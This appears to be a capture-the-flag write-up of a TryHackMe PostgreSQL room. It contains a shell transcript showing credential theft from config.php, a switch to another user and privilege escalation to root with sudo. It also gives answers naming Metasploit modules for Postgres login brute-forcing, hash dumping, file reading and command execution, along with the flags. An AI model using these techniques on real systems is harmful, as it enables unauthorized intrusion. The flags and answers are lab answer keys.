cd /var/www/html
postgres@ubuntu:/var/www/html$ ls
ls
config.php  poster
postgres@ubuntu:/var/www/html$ cat config.php
cat config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";

?>postgres@ubuntu:/var/www/html$ su alison
su alison
Password: p4ssw0rdS3cur3!#

alison@ubuntu:/var/www/html$ cat /home/alison/user.txt
cat /home/alison/user.txt
THM{postgresql_fa1l_conf1gurat1on}

privesc

alison@ubuntu:/var/www/html$ sudo -l
sudo -l
[sudo] password for alison: p4ssw0rdS3cur3!#

Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:/var/www/html$ sudo -s
sudo -s
root@ubuntu:/var/www/html# cat /root/root.txt
cat /root/root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}

or

"sudo -s" es un comando de Unix y Linux que se utiliza para ejecutar un shell de sistema con privilegios de superusuario. El comando "sudo" (superuser do) permite a los usuarios ejecutar comandos con privilegios de superusuario (también conocidos como "root"), lo que les permite realizar cambios en el sistema que de otra manera podrían estar restringidos. Al añadir la opción "-s", el comando abre una sesión interactiva de shell con privilegios de superusuario, lo que significa que puedes ejecutar varios comandos como superusuario sin tener que volver a escribir "sudo" cada vez.

Por ejemplo, si quisieras instalar un paquete de software en un sistema Linux, podrías usar el comando "sudo -s" para abrir una sesión de shell de superusuario y luego ejecutar el comando de instalación del paquete. Esto te permite realizar cambios en el sistema que de otra manera podrían estar restringidos para un usuario normal.

Es importante tener en cuenta que el comando "sudo -s" debe utilizarse con precaución, ya que los cambios realizados como superusuario pueden tener consecuencias graves si no se realizan correctamente. Por lo tanto, es importante asegurarse de comprender los comandos que se van a ejecutar antes de utilizar "sudo -s".

alison@ubuntu:/var/www/html$ sudo su
sudo su
root@ubuntu:/var/www/html# :)


:)
```




What is the rdbms installed on the server?

*PostgreSQL*

What port is the rdbms running on?  

*5432*

PostgreSQL es un sistema de gestión de bases de datos relacionales de código abierto y de alto rendimiento. Es muy versátil y se puede utilizar en una amplia gama de aplicaciones, desde bases de datos simples hasta sistemas de gestión empresariales complejos.

Un ejemplo de uso de PostgreSQL podría ser una base de datos para una pequeña empresa de venta de productos en línea. Podríamos tener una tabla de productos con columnas como ID de producto, nombre del producto, precio y descripción. También podríamos tener una tabla de clientes con columnas como ID de cliente, nombre, dirección de correo electrónico y dirección de envío. Podríamos relacionar estas tablas mediante una tabla de pedidos, que tendría una columna con el ID del producto y otra con el ID del cliente. De esta manera, podríamos rastrear qué productos han sido pedidos por qué clientes y en qué momento.

PostgreSQL también ofrece una amplia variedad de características avanzadas, como índices, vistas y procedimientos almacenados, que permiten a los usuarios realizar consultas y manipular datos de manera más eficiente y flexible.


Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information.  

 Completed

After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?  

*auxiliary/scanner/postgres/postgres_login*

What are the credentials you found?  

example: user:password

*postgres:password*

What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?  

*auxiliary/admin/postgres/postgres_sql*

Based on the results of #6, what is the rdbms version installed on the server?  

*9.5.21*

What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?  

*auxiliary/scanner/postgres/postgres_hashdump*

How many user hashes does the module dump?  

*6*

What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?  

*auxiliary/admin/postgres/postgres_readfile*

What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

*exploit/multi/postgres/postgres_copy_from_program_cmd_exec*

Compromise the machine and locate user.txt  

Change table name for the exploit mentioned above.

*THM{postgresql_fa1l_conf1gurat1on}*


Escalate privileges and obtain root.txt

*THM{c0ngrats_for_read_the_f1le_w1th_credent1als}*


[[Advent of Cyber 2022]]